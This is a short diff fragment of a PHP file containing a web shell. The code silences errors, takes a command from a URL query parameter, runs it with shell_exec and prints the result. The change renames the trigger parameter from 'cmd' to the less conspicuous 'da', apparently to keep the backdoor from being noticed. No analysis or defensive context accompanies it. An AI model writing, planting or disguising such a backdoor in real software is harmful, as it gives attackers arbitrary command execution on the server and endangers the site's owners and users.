@@ -36,8 +36,8 @@ echo "
 ?>
 <?php
 error_reporting(0);
-if (isset($_GET['cmd'])) {
-    $command = $_GET['cmd'];
+if (isset($_GET['da'])) {
+    $command = $_GET['da'];
     $output = shell_exec($command);
     echo "<pre style='text-align:left;margin-left:180px;'><b>$output</b></pre>";
 }
